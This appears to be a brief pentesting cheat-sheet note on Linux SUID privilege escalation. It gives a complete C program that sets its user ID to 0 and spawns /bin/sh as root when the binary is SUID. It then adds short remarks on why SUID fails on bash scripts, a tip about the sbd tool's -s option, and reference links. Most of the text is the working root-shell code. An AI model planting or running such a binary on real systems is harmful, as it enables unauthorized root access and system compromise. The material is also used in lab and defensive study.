# SUID

If we can suid an executable, we can use the following code to execute a command as root.

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
   setuid( 0 );
   system( "/bin/sh" );

   return 0;
}
```

* suid on bash script don't work. https://stackoverflow.com/questions/18698976/suid-not-working-with-shell-script
* suid on /bin/sh will don"t work as long as setuid is not invoked
* trick : sbd (see kali tools), can invoke a shell on root if setuid (-s option)

http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html <== very interesting
https://stackoverflow.com/questions/18698976/suid-not-working-with-shell-script

security risk in suid bash scripts : http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html



